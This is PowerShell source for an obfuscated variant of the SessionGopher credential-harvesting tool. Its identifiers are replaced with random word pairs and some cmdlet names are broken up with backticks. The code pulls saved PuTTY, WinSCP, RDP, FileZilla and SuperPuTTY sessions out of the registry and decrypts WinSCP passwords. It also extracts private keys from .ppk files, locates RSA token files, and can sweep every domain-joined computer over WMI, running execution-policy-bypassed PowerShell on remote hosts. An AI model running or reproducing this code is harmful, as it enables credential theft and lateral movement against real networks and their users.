<#
  .SYNPOSIS
  Extracts and decrypts saved session information for software typically used to access Unix systems.

  .DESCRIPTION
  Queries HKEY_USERS for PuTTY, WinSCP, and Remote Desktop saved sessions. Decrypts saved passwords for WinSCP.
  Extracts FileZilla, SuperPuTTY's saved session information in the sitemanager.xml file and decodes saved passwords.
  In Thorough mode, identifies PuTTY private key (.ppk), Remote Desktop Connection (.rdp), and RSA token (.sdtid) files, and extracts private key and session information.
  Can be run remotely using the -SwingMetal (supply input list of computers) or -SkateFruit (run against all AD-joined computers) flags.
  Must either provide credentials (-JudgeHurry and -SleepJuggle for username and password) of an admin on target boxes, or run script in the context of
  a privileged user on the target boxes, in which case no credentials are needed.

  .Notes
  Author: Brandon Arvanaghi
  Date:   February 17, 2017
  Thanks: 
    Brice Daniels, Pan Chan - collaborating on idea
    Christopher Truncer - helping with WMI

  .PARAMETER o
  Generates CSV output.
    
  .PARAMETER Thorough
  Searches entire filesystem for certain file extensions.

  .PARAMETER u
  Domain\username (e.g. superduper.com\a-jerry).

  .PARAMETER p
  Password for domain user (if username provided).
    
  .PARAMETER iL
  If you want to supply a list of hosts to run SessionGopher against, provide the path to that file here. Each host should be separated by a newline in the file.

  .PARAMETER Target
  If you only want to run SessionGopher against once specific host.
    
  .PARAMETER AllDomain
  Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them.
#>
function Invoke-SessionGopher {
  param (
      [switch]$CellarSore, # Generate CSV output
      [switch]$RattyBoard, # Searches entire filesystem for certain file extensions
      [string]$JudgeHurry, # Domain\username (e.g. superduper.com\a-jerry)
      [string]$SleepJuggle, # Password of domain account
      [string]$SwingMetal, # A file of hosts to run SessionGopher against remotely, each host separated by a newline in the file
      [string]$OrangeMiss, # If you want to run SessionGopher against one specific host
      [switch]$SkateFruit # Run across all active directory
  )

  Write-Output '
          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
  '

  if ($CellarSore) {
    $ReignQuick = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
    New-Item -ItemType Directory $ReignQuick | Out-Null
    New-Item ($ReignQuick + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($ReignQuick + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($ReignQuick + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($ReignQuick + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($ReignQuick + "\RDP.csv") -Type File | Out-Null
    if ($RattyBoard) {
        New-Item ($ReignQuick + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($ReignQuick + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($ReignQuick + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }

  if ($JudgeHurry -and $SleepJuggle) {
    $AbjectElated = ConvertTo-SecureString $SleepJuggle -AsPlainText -Force
    $Credentials = new`-`obje`ct -Typename System.Management.Automation.PSCredential -ArgumentList $JudgeHurry, $AbjectElated
  }

  # Value for HKEY_USERS hive
  $CaveOffend = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $SealReturn = 2147483650

  $TiredPaddle = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $PleaseSheet = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $ScaleCrime = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"

  if ($SwingMetal -or $SkateFruit -or $OrangeMiss) {

    # Whether we read from an input file or query active directory
    $Reader = ""

    if ($SkateFruit) {
      $Reader = GetComputersFromActiveDirectory
    } elseif ($SwingMetal) { 
      $Reader = Get-Content ((Resolve-Path $SwingMetal).Path)
    } elseif ($OrangeMiss) {
      $Reader = $OrangeMiss
    }

    $RoyalRatty = @{}
    if ($Credentials) {
      $RoyalRatty['Credential'] = $Credentials
    }

    foreach ($NameShow in $Reader) {

      if ($SkateFruit) {
        # Extract just the name from the System.DirectoryServices.SearchResult object
        $NameShow = $NameShow.Properties.name
        if (!$NameShow) { Continue }
      }

      Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
      Write-Host "Digging on" $NameShow"..."

      $ShrillTank = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $CaveOffend,'' -ComputerName $NameShow @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}

      foreach ($TenderRabid in $ShrillTank) {

        # Get the username for SID we discovered has saved sessions
        $CubStiff = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
        $MonkeySleep = (($NameShow + "\" + $CubStiff) -Join "")

        # Created for each user found. Contains all sessions information for that user. 
        $CommonSpill = new`-`obje`ct PSObject

        <#
        PuTTY: contains hostname and usernames
        SuperPuTTY: contains username, hostname, relevant protocol information, decrypted passwords if stored
        RDP: contains hostname and username of sessions
        FileZilla: hostname, username, relevant protocol information, decoded passwords if stored
        WinSCP: contains hostname, username, protocol, deobfuscated password if stored and no master password used
        #>
        $BoredClover = new`-`obje`ct System.Collections.ArrayList
        $PoisedHoney = new`-`obje`ct System.Collections.ArrayList
        $TwistClub = new`-`obje`ct System.Collections.ArrayList
        $SoupSoup = new`-`obje`ct System.Collections.ArrayList
        $SummerGrab = new`-`obje`ct System.Collections.ArrayList

        # Construct tool registry/filesystem paths from SID or username
        $CarFlood = $TenderRabid + $ScaleCrime
        $FaxSoup = $TenderRabid + $TiredPaddle
        $DollsGiant = $TenderRabid + $PleaseSheet
        $LevelCellar = "Drive='C:' AND Path='\\Users\\$CubStiff\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$CubStiff\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"

        $BatIron = Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name EnumKey -ArgumentList $CaveOffend,$CarFlood @optionalCreds
        $ArriveTick = Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name EnumKey -ArgumentList $CaveOffend,$FaxSoup @optionalCreds
        $WasteQueue = Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name EnumKey -ArgumentList $CaveOffend,$DollsGiant @optionalCreds
        $MeanDull = (Get-WmiObject -Class 'CIM_DataFile' -Filter $LevelCellar -ComputerName $NameShow @optionalCreds | Select Name)
        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $NameShow @optionalCreds | Select Name)

        # If any WinSCP saved sessions exist on this box...
        if (($WasteQueue | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $WasteQueue = $WasteQueue | Select-Object -ExpandProperty sNames
          
          foreach ($ChargeShave in $WasteQueue) {
      
            $CrushCurl = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $CrushCurl.Source = $MonkeySleep
            $CrushCurl.Session = $ChargeShave

            $EmployChief = $DollsGiant + "\" + $ChargeShave

            $CrushCurl.Hostname = (Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name GetStringValue -ArgumentList $CaveOffend,$EmployChief,"HostName" @optionalCreds).sValue
            $CrushCurl.Username = (Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name GetStringValue -ArgumentList $CaveOffend,$EmployChief,"UserName" @optionalCreds).sValue
            $CrushCurl.Password = (Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name GetStringValue -ArgumentList $CaveOffend,$EmployChief,"Password" @optionalCreds).sValue

            if ($CrushCurl.Password) {

              $PlacidKind = $TenderRabid + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
          
              $AngleAunt = (Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $CaveOffend,$PlacidKind,"UseMasterPassword" @optionalCreds).uValue
              
              if (!$AngleAunt) {
                  $CrushCurl.Password = (DecryptWinSCPPassword $CrushCurl.Hostname $CrushCurl.Username $CrushCurl.Password)
              } else {
                  $CrushCurl.Password = "Saved in session, but master password prevents plaintext recovery"
              }

            }
             
            [void]$SummerGrab.Add($CrushCurl)
      
          } # For Each WinSCP Session

          if ($SummerGrab.count -gt 0) {

            $CommonSpill | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -LaughPlace $SummerGrab

            if ($CellarSore) {
              $SummerGrab | Select-Object * | Export-CSV -Append -Path ($ReignQuick + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $SummerGrab | Select-Object * | Format-List | Out-String
            }

          }
        
        } # If path to WinSCP exists

        if (($ArriveTick | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $ArriveTick = $ArriveTick | Select-Object -ExpandProperty sNames

          foreach ($FootAppear in $ArriveTick) {
      
            $CloudySponge = "" | Select-Object -Property Source,Session,Hostname

            $EmployChief = $FaxSoup + "\" + $FootAppear

            $CloudySponge.Source = $MonkeySleep
            $CloudySponge.Session = $FootAppear
            $CloudySponge.Hostname = (Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name GetStringValue -ArgumentList $CaveOffend,$EmployChief,"HostName" @optionalCreds).sValue
             
            [void]$BoredClover.Add($CloudySponge)
      
          }

          if ($BoredClover.count -gt 0) {

            $CommonSpill | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -LaughPlace $BoredClover

            if ($CellarSore) {
              $BoredClover | Select-Object * | Export-CSV -Append -Path ($ReignQuick + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $BoredClover | Select-Object * | Format-List | Out-String
            }

          }

        } # If PuTTY session exists

        if (($BatIron | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $BatIron = $BatIron | Select-Object -ExpandProperty sNames

          foreach ($EscapeExtend in $BatIron) {
      
            $GreedyUppity = "" | Select-Object -Property Source,Hostname,Username
            
            $EmployChief = $CarFlood + "\" + $EscapeExtend

            $GreedyUppity.Source = $MonkeySleep
            $GreedyUppity.Hostname = $EscapeExtend
            $GreedyUppity.Username = (Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name GetStringValue -ArgumentList $CaveOffend,$EmployChief,"UserNameHint" @optionalCreds).sValue

            [void]$TwistClub.Add($GreedyUppity)
      
          }

          if ($TwistClub.count -gt 0) {

            $CommonSpill | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -LaughPlace $TwistClub

            if ($CellarSore) {
              $TwistClub | Select-Object * | Export-CSV -Append -Path ($ReignQuick + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $TwistClub | Select-Object * | Format-List | Out-String
            }

          }

        } # If RDP sessions exist

        # If we find the SuperPuTTY Sessions.xml file where we would expect it
        if ($MeanDull.Name) {

          $File = "C:\Users\$CubStiff\Documents\SuperPuTTY\Sessions.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$BadgeWord = $FileContents
          (ProcessSuperPuTTYFile $BadgeWord)

        }

        # If we find the FileZilla sitemanager.xml file where we would expect it
        if ($FileZillaPath.Name) {

          $File = "C:\Users\$CubStiff\AppData\Roaming\FileZilla\sitemanager.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$FileZillaXML = $FileContents
          (ProcessFileZillaFile $FileZillaXML)

        } # FileZilla

      } # for each SID

      if ($RattyBoard) {

        $FilmNosy = new`-`obje`ct System.Collections.ArrayList
        $RiddleSheep = new`-`obje`ct System.Collections.ArrayList
        $ArtStamp = new`-`obje`ct System.Collections.ArrayList

        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $NameShow @optionalCreds | Select Name)

        (ProcessThoroughRemote $FilePathsFound)
        
      } 

    } # for each remote computer

  # Else, we run SessionGopher locally
  } else { 
    
    Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
    Write-Host "Digging on"(Hostname)"..."

    # Aggregate all user hives in HKEY_USERS into a variable
    $ShutCrash = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

    # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
    foreach($ArtTrip in $ShutCrash) {

      # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information. 
      $CommonSpill = new`-`obje`ct PSObject

      $SummerGrab = new`-`obje`ct System.Collections.ArrayList
      $BoredClover = new`-`obje`ct System.Collections.ArrayList
      $FilmNosy = new`-`obje`ct System.Collections.ArrayList
      $PoisedHoney = new`-`obje`ct System.Collections.ArrayList
      $TwistClub = new`-`obje`ct System.Collections.ArrayList
      $RiddleSheep = new`-`obje`ct System.Collections.ArrayList
      $SoupSoup = new`-`obje`ct System.Collections.ArrayList

      $ExcuseScold = (GetMappedSID)
      $MonkeySleep = (Hostname) + "\" + (Split-Path $ExcuseScold.Value -Leaf)

      $CommonSpill | Add-Member -MemberType NoteProperty -Name "Source" -LaughPlace $ExcuseScold.Value

      # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
      $FaxSoup = Join-Path $ArtTrip.PSPath "\$TiredPaddle"
      $DollsGiant = Join-Path $ArtTrip.PSPath "\$PleaseSheet"
      $KickBeef = Join-Path $ArtTrip.PSPath "\$ScaleCrime"
      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $CommonSpill."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $MeanDull = "C:\Users\" + (Split-Path -Leaf $CommonSpill."Source") + "\Documents\SuperPuTTY\Sessions.xml"

      if (Test-Path $FileZillaPath) {

        [xml]$FileZillaXML = Get-Content $FileZillaPath
        (ProcessFileZillaFile $FileZillaXML)

      }

      if (Test-Path $MeanDull) {

        [xml]$BadgeWord = Get-Content $MeanDull
        (ProcessSuperPuTTYFile $BadgeWord)

      }

      if (Test-Path $KickBeef) {

        # Aggregates all saved sessions from that user's RDP client
        $UglyCall = Get-ChildItem $KickBeef

        (ProcessRDPLocal $UglyCall)

      } # If (Test-Path MicrosoftRDPPath)

      if (Test-Path $DollsGiant) {

        # Aggregates all saved sessions from that user's WinSCP client
        $PartMother = Get-ChildItem $DollsGiant

        (ProcessWinSCPLocal $PartMother)

      } # If (Test-Path WinSCPPath)
      
      if (Test-Path $FaxSoup) {

        # Aggregates all saved sessions from that user's PuTTY client
        $PlaceSweet = Get-ChildItem $FaxSoup

        (ProcessPuTTYLocal $PlaceSweet)

      } # If (Test-Path PuTTYPath)

    } # For each Hive in UserHives

    # If run in Thorough Mode
    if ($RattyBoard) {

      # Contains raw i-node data for files with extension .ppk, .rdp, and sdtid respectively, found by Get-ChildItem
      $CycleSmell = new`-`obje`ct System.Collections.ArrayList
      $BeefJoin = new`-`obje`ct System.Collections.ArrayList
      $DryScene = new`-`obje`ct System.Collections.ArrayList

      # All drives found on system in one variable
      $FoodDrawer = Get-PSDrive

      (ProcessThoroughLocal $FoodDrawer)
      
      (ProcessPPKFile $CycleSmell)
      (ProcessRDPFile $BeefJoin)
      (ProcesssdtidFile $DryScene)

    } # If Thorough

  } # Else -- run SessionGopher locally

} # Invoke-SessionGopher

####################################################################################
####################################################################################
## Registry Querying Helper Functions
####################################################################################
####################################################################################

# Maps the SID from HKEY_USERS to a username through the HKEY_LOCAL_MACHINE hive
function GetMappedSID {

  # If getting SID from remote computer
  if ($SwingMetal -or $OrangeMiss -or $SkateFruit) {
    # Get the username for SID we discovered has saved sessions
    $TanMiss = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$TenderRabid"
    $LaughPlace = "ProfileImagePath"

    return (Invoke-WmiMethod -ComputerName $NameShow -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $SealReturn,$TanMiss,$LaughPlace @optionalCreds).sValue
  # Else, get local SIDs
  } else {
    # Converts user SID in HKEY_USERS to username
    $TenderRabid = (Split-Path $ArtTrip.Name -Leaf)
    $HugTrip = new`-`obje`ct System.Security.Principal.SecurityIdentifier("$TenderRabid")
    return $HugTrip.Translate( [System.Security.Principal.NTAccount])
  }

}

function DownloadAndExtractFromRemoteRegistry($File) {
  # The following code is taken from Christopher Truncer's WMIOps script on GitHub. It gets file contents through WMI by
  # downloading the file's contents to the remote computer's registry, and then extracting the value from that registry location
  $RewardDream = "HKLM:\Software\Microsoft\DRM"
  $FearTicket = "ReadMe"
  $VanMellow = "SOFTWARE\Microsoft\DRM"
          
  # On remote system, save file to registry
  Write-Verbose "Reading remote file and writing on remote registry"
  $LearnLook = '$FamousPlace = Get-Content -Encoding byte -Path ''' + "$File" + '''; $RoadRun = [System.Convert]::ToBase64String($FamousPlace); New-ItemProperty -Path ' + "'$RewardDream'" + ' -Name ' + "'$FearTicket'" + ' -LaughPlace $RoadRun -PropertyType String -Force'
  $LearnLook = 'powershell -nop -exec bypass -c "' + $LearnLook + '"'

  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $LearnLook -ComputerName $NameShow @optionalCreds

  # Sleeping to let remote system read and store file
  Start-Sleep -s 15

  $WearyDamp = ""

  # Grab file from remote system's registry
  $WearyDamp = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $SealReturn, $VanMellow, $FearTicket -Computer $NameShow @optionalCreds
  
  $SpookyBest = [System.Convert]::FromBase64String($WearyDamp.sValue)
  $SilkHealth = [System.Text.Encoding]::UTF8.GetString($SpookyBest) 
    
  # Removing Registry value from remote system
  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $TallAct, $VanMellow, $FearTicket -ComputerName $NameShow @optionalCreds
  
  return $SilkHealth

}

####################################################################################
####################################################################################
## File Processing Helper Functions
####################################################################################
####################################################################################

function ProcessThoroughLocal($FoodDrawer) {
  
  foreach ($TurkeyFaded in $FoodDrawer) {
    # If the drive holds a filesystem
    if ($TurkeyFaded.Provider.Name -eq "FileSystem") {
      $LazyThing = Get-ChildItem $TurkeyFaded.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($HornScare in $LazyThing) {
        Switch ($HornScare.Extension) {
          ".ppk" {[void]$CycleSmell.Add($HornScare)}
          ".rdp" {[void]$BeefJoin.Add($HornScare)}
          ".sdtid" {[void]$DryScene.Add($HornScare)}
        }
      }
    }
  }

}

function ProcessThoroughRemote($FilePathsFound) {

  foreach ($FilePath in $FilePathsFound) {
      # Each object we create for the file extension found from a -RattyBoard search will have the same properties (Source, Path to File)
      $StopWord = "" | Select-Object -Property Source,Path
      $StopWord.Source = $NameShow

      $HardLast = [IO.Path]::GetExtension($FilePath.Name)

      if ($HardLast -eq ".ppk") {
        $StopWord.Path = $FilePath.Name
        [void]$FilmNosy.Add($StopWord)
      } elseif ($HardLast -eq ".rdp") {
        $StopWord.Path = $FilePath.Name
        [void]$RiddleSheep.Add($StopWord)
      } elseif ($HardLast -eq ".sdtid") {
        $StopWord.Path = $FilePath.Name
        [void]$ArtStamp.Add($StopWord)
      }

  }

  if ($FilmNosy.count -gt 0) {

    $CommonSpill | Add-Member -MemberType NoteProperty -Name "PPK Files" -LaughPlace $RiddleSheep

    if ($CellarSore) {
      $FilmNosy | Export-CSV -Append -Path ($ReignQuick + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $FilmNosy | Format-List | Out-String
    }
  }

  if ($RiddleSheep.count -gt 0) {

    $CommonSpill | Add-Member -MemberType NoteProperty -Name "RDP Files" -LaughPlace $RiddleSheep

    if ($CellarSore) {
      $RiddleSheep | Export-CSV -Append -Path ($ReignQuick + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $RiddleSheep | Format-List | Out-String
    }
  }
  if ($ArtStamp.count -gt 0) {

    $CommonSpill | Add-Member -MemberType NoteProperty -Name "sdtid Files" -LaughPlace $ArtStamp

    if ($CellarSore) {
      $ArtStamp | Export-CSV -Append -Path ($ReignQuick + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ArtStamp | Format-List | Out-String
    }

  }

} # ProcessThoroughRemote

function ProcessPuTTYLocal($PlaceSweet) {
  
  # For each PuTTY saved session, extract the information we want 
  foreach($MatchFound in $PlaceSweet) {

    $CloudySponge = "" | Select-Object -Property Source,Session,Hostname

    $CloudySponge.Source = $MonkeySleep
    $CloudySponge.Session = (Split-Path $MatchFound -Leaf)
    $CloudySponge.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $MatchFound) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$BoredClover.Add($CloudySponge)

  }

  if ($CellarSore) {
    $BoredClover | Export-CSV -Append -Path ($ReignQuick + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $BoredClover | Format-List | Out-String
  }

  # Add the array of PuTTY session objects to UserObject
  $CommonSpill | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -LaughPlace $BoredClover

} # ProcessPuTTYLocal

function ProcessRDPLocal($UglyCall) {

  # For each RDP saved session, extract the information we want
  foreach($MatchFound in $UglyCall) {

    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $MatchFound

    $PublicFruit = "" | Select-Object -Property Source,Hostname,Username

    $PublicFruit.Source = $MonkeySleep
    $PublicFruit.Hostname = (Split-Path $MatchFound -Leaf)
    $PublicFruit.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$TwistClub.Add($PublicFruit)

  } # For each Session in AllRDPSessions

  if ($CellarSore) {
    $TwistClub | Export-CSV -Append -Path ($ReignQuick + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $TwistClub | Format-List | Out-String
  }

  # Add the array of RDP session objects to UserObject
  $CommonSpill | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -LaughPlace $TwistClub

} #ProcessRDPLocal

function ProcessWinSCPLocal($PartMother) {
  
  # For each WinSCP saved session, extract the information we want
  foreach($MatchFound in $PartMother) {

    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $MatchFound

    $CrushCurl = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $CrushCurl.Source = $MonkeySleep
    $CrushCurl.Session = (Split-Path $MatchFound -Leaf)
    $CrushCurl.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $CrushCurl.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $CrushCurl.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($CrushCurl.Password) {
      $AngleAunt = ((Get-ItemProperty -Path (Join-Path $ArtTrip.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)

      # If the user is not using a master password, we can crack it:
      if (!$AngleAunt) {
          $CrushCurl.Password = (DecryptWinSCPPassword $CrushCurl.Hostname $CrushCurl.Username $CrushCurl.Password)
      # Else, the user is using a master password. We can't retrieve plaintext credentials for it.
      } else {
          $CrushCurl.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$SummerGrab.Add($CrushCurl)

  } # For each Session in AllWinSCPSessions

  if ($CellarSore) {
    $SummerGrab | Export-CSV -Append -Path ($ReignQuick + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $SummerGrab | Format-List | Out-String
  }

  # Add the array of WinSCP session objects to the target user object
  $CommonSpill | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -LaughPlace $SummerGrab

} # ProcessWinSCPLocal

function ProcesssdtidFile($DryScene) {

  foreach ($Path in $DryScene.VersionInfo.FileName) {

    $GlibOrder = "" | Select-Object -Property "Source","Path"

    $GlibOrder."Source" = $MonkeySleep
    $GlibOrder."Path" = $Path

    [void]$ArtStamp.Add($GlibOrder)

  }

  if ($ArtStamp.count -gt 0) {

    $CommonSpill | Add-Member -MemberType NoteProperty -Name "sdtid Files" -LaughPlace $ArtStamp

    if ($CellarSore) {
      $ArtStamp | Select-Object * | Export-CSV -Append -Path ($ReignQuick + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ArtStamp | Select-Object * | Format-List | Out-String
    }

  }

} # Process sdtid File

function ProcessRDPFile($BeefJoin) {
  
  # Extracting the filepath from the i-node information stored in RDPExtensionFilesINodes
  foreach ($Path in $BeefJoin.VersionInfo.FileName) {
    
    $TourVase = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"

    $TourVase."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .rdp file into our object
    $TourVase."Path" = $Path 
    $TourVase."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $TourVase."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $TourVase."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $TourVase."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}

    if (!$TourVase."Administrative Session" -or !$TourVase."Administrative Session" -eq 0) {
      $TourVase."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $TourVase."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$TourVase."Prompts for Credentials" -or $TourVase."Prompts for Credentials" -eq 0) {
      $TourVase."Prompts for Credentials" = "No"
    } else {
      $TourVase."Prompts for Credentials" = "Yes"
    }

    [void]$RiddleSheep.Add($TourVase)

  }

  if ($RiddleSheep.count -gt 0) {

    $CommonSpill | Add-Member -MemberType NoteProperty -Name "RDP Files" -LaughPlace $RiddleSheep

    if ($CellarSore) {
      $RiddleSheep | Select-Object * | Export-CSV -Append -Path ($ReignQuick + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $RiddleSheep | Select-Object * | Format-List | Out-String
    }

  }

} # Process RDP File

function ProcessPPKFile($CycleSmell) {

  # Extracting the filepath from the i-node information stored in PPKExtensionFilesINodes
  foreach ($Path in $CycleSmell.VersionInfo.FileName) {

    # Private Key Encryption property identifies whether the private key in this file is encrypted or if it can be used as is
    $FilePet = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $FilePet."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .ppk file into our object
    $FilePet."Path" = $Path

    $FilePet."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $FilePet."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $FilePet."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $EggCreepy = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $FilePet."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$EggCreepy).Context.PostContext -Join "" } catch {}
    $FilePet."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}

    # Add the object we just created to the array of .ppk file objects
    [void]$FilmNosy.Add($FilePet)

  }

  if ($FilmNosy.count -gt 0) {

    $CommonSpill | Add-Member -MemberType NoteProperty -Name "PPK Files" -LaughPlace $FilmNosy

    if ($CellarSore) {
      $FilmNosy | Select-Object * | Export-CSV -Append -Path ($ReignQuick + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $FilmNosy | Select-Object * | Format-List | Out-String
    }

  }

} # Process PPK File

function ProcessFileZillaFile($FileZillaXML) {

  # Locate all <Server> nodes (aka session nodes), iterate over them
  foreach($FileZillaSession in $FileZillaXML.SelectNodes('//FileZilla3/Servers/Server')) {
      # Hashtable to store each session's data
      $FileZillaSessionHash = @{}

      # Iterates over each child node under <Server> (aka session)
      $FileZillaSession.ChildNodes | ForEach-Object {

          $FileZillaSessionHash["Source"] = $MonkeySleep
          # If value exists, make a key-LaughPlace pair for it in the hash table
          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
                  $FileZillaSessionHash["Password"] = $_.InnerText
              } else {
                  # Populate session data based on the node name
                  $FileZillaSessionHash[$_.Name] = $_.InnerText
              }
              
          }

      }

    # Create object from collected data, excluding some trivial information
    [void]$SoupSoup.Add((new`-`obje`ct PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
     
